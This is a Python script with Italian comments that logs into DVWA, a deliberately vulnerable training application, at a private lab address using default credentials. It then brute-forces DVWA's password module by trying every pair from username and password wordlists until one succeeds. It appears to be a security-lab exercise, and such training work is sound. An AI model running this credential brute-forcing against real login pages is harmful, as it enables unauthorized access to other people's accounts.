 # Importa le librerie necessarie
import requests
from requests.exceptions import RequestException

# Funzione per fare il login in DVWA (Damn Vulnerable Web Application)
def login_to_dvwa(url, username, password):
    # Dati di login
    login_data = {
        'username': username,
        'password': password,
        'Login': 'Login'
    }

    try:
        # Inizia una sessione web
        session = requests.Session()
        # Effettua una richiesta per fare il login (senza permettere reindirizzamenti)
        response = session.post(url, data=login_data, allow_redirects=False)
        # Prende l'indirizzo dalla risposta
        response_location = response.headers['location']

        # Verifica se il login è riuscito
        if response_location == 'index.php':
            # Stampa un messaggio se il login è andato bene
            print(f"Login riuscito come {username} con password: {password}")
            # Restituisce la sessione per usarla in altre richieste autenticate
            return session
        else:
            # Stampa un messaggio se il login non è riuscito
            print(f"Login non riuscito come {username} con password :{password}")

    except requests.RequestException as e:
        # Stampa un messaggio se c'è un errore durante il login
        print(f"Errore durante la richiesta di login a {url}: {e}")

# Funzione per fare il brute force login in DVWA
def brute_force_login(url, username, password, session):
    # Dati di login
    login_data = {
        'username': username,
        'password': password,
        'Login': 'Login'
    }

    try:
        # Effettua una richiesta usando la stessa sessione
        response = session.get(url, params=login_data)

        # Verifica se la risposta contiene un messaggio di successo
        if "Welcome to the password protected area admin" in response.text:
            # Stampa un messaggio se il login è riuscito
            print("Login riuscito con:", username, " - ", password)
            # Restituisce True per indicare un login riuscito
            return True
        else:
            # Stampa un messaggio se il login non è riuscito
            print("Login non riuscito con:", username, " - ", password)
            # Restituisce False per indicare un login non riuscito
            return False

    except RequestException as e:
        # Stampa un messaggio se c'è un errore durante il brute force login
        print(f"Errore durante la richiesta di login a {url}: {e}")

# Parte del codice che si esegue solo se questo script è il principale
if __name__ == "__main__":
    # URL di login di DVWA
    dvwa_url = "http://192.168.50.101/dvwa/login.php"  # Sostituisci con l'URL del tuo DVWA
    default_username = "admin"
    default_password = "password"

    # Chiamata alla funzione di login iniziale
    session = login_to_dvwa(dvwa_url, default_username, default_password)

    # Chiamata alla funzione di brute force usando la stessa sessione
    dvwa_url_brute = "http://192.168.50.101/dvwa/vulnerabilities/brute/"
    with open('username.txt', 'r') as user_file:
        for username in user_file:
            username = username.strip()

            with open('password.txt', 'r') as password_file:
                for password in password_file:
                    password = password.strip()
                    # Esegue il brute force login e termina il programma se il login è riuscito
                    risultato = brute_force_login(dvwa_url_brute, username, password, session)
                    if risultato == True:
                        exit()
